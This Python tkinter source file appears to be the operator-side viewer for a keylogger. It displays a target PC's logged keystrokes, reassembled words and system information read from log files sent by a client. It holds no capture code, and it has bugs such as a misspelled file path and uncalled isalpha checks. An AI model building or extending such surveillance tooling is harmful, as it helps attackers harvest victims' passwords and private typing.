from tkinter import Tk, Button, Label, ttk, Listbox, Scrollbar
import os

class GUIWindow:
	def __init__(self, title):
		self.window = Tk()
		self.window.title(title)
		self.window.resizable(False, False)
		self.is_characters = True
		self.tmp_word = ""


	def run(self):
		btn_PCInfo = Button(self.window, text = "PC Information", command = self.PCInfo_clicked)
		btn_PCInfo.grid(column = 0, row = 1, padx = 10, pady = 10)

		ttk.Separator(self.window).place(x = 0, y = 45, relwidth=1)

		btn_characters = Button(self.window, text = "Characters", command = self.characters_clicked)
		btn_characters.grid(column = 1, row = 1, padx = 10, pady = 10)

		btn_words = Button(self.window, text = "Words", command = self.words_clicked)
		btn_words.grid(column = 2, row = 1, padx = 10, pady = 10)

		label_date_and_time = Label(self.window, text = "Date & Time")
		label_date_and_time.grid(column = 0, row = 2)

		self.label_character = Label(self.window, text = "Characters")
		self.label_character.grid(column = 1, row = 2, columnspan = 2)

		scrollbar = Scrollbar(self.window)

		self.listbox = Listbox(self.window, width = 70, height = 25, yscrollcommand=scrollbar.set)
		self.listbox.grid(column = 0, row = 3, columnspan = 3, padx = (10,0), pady = (0,10))

		self.read_characters()

		scrollbar.config(command = self.listbox.yview)
		scrollbar.grid(column = 3, row = 3, pady = 10, padx = (0,10), sticky = "ns")

		self.window.mainloop()


	#Shows the target PC's information in a new window
	def PCInfo_clicked(self):
		popup_window = Tk()
		popup_window.title("System Informations")
		popup_window.resizable(False, False)

		label_info = Label(popup_window)
		label_info.grid(column = 0, row = 0)

		with open("../logs/system_info.txt", "r") as file:
			info = file.read()
			label_info.config(text = info)

		popup_window.mainloop()


	#Reads in the logged characters from the 'log.csv' file and shows them in the main window
	def read_characters(self):
		if os.path.isfile("../logs/log.csv"):
			file = open("../logs/log.csv", "r")
			while True:
				tmp = file.readline().split(",")
				if tmp[0] == "":
					break

				tmp[0] = tmp[0].strip()
				tmp[1] = tmp[1].strip()
				self.insert_listbox(tmp[0], tmp[1])
			file.close()


	#Reads in the logged words from the 'log.csv' file and shows them in the main window
	def read_words(self):
		if os.path.isfile("../logs.log.csv"):
			file = open("../logs/log.csv", "r")
			word = ""
			date = ""

			while True:
				tmp = file.readline().split(",")
				if tmp[0] == "":
					break

				tmp[0] = tmp[0].strip()
				date = tmp[0]
				tmp[1] = tmp[1].strip()
				if (tmp[1].isalpha or tmp[1].isnumeric or tmp[1] in '~!@#$%^&*()_-+=[]{}\\|;:\'",.></?') and len(tmp[1]) == 1:
					word += tmp[1]
				elif word != "":
					self.insert_listbox(tmp[0], word)
					word = ""

			if word != "":
				self.insert_listbox(date, word)
			file.close()


	#Processes the data given in argument and calls the insertData function
	#   @data - The data sent from the client to the server: [date|time, character]
	def insert_data(self, data):
		if not self.is_characters:
			data[1] = data[1].strip()
			if data[1].isalpha and len(data[1]) == 1:
				self.tmp_word += data[1]
			elif self.tmp_word != "":
				self.insert_listbox(data[0], self.tmp_word)
				self.tmp_word = ""
		else :
			self.insert_listbox(data[0].strip(), data[1].strip())


	#Formats and inserts the given data to the listbox
	#   @date - the date and hour when the character was pushed
	#   @character - the pushed character
	def insert_listbox(self, date, character):
		line = date
		line += " "*(70-len(date))
		line += character
		self.listbox.insert(self.listbox.size(), line)


	#Refreshes the listbox, to show words
	def words_clicked(self):
		if not self.is_characters:
			return None

		self.is_characters = False
		self.listbox.delete(0, 'end')
		self.read_words()
		self.label_character.config(text = "Words")


	#Refreshes the listbox, to show characters
	def characters_clicked(self):
		if self.is_characters:
			return None

		self.is_characters = True
		self.listbox.delete(0, 'end')
		self.read_characters()
		self.label_character.config(text = "Characters")

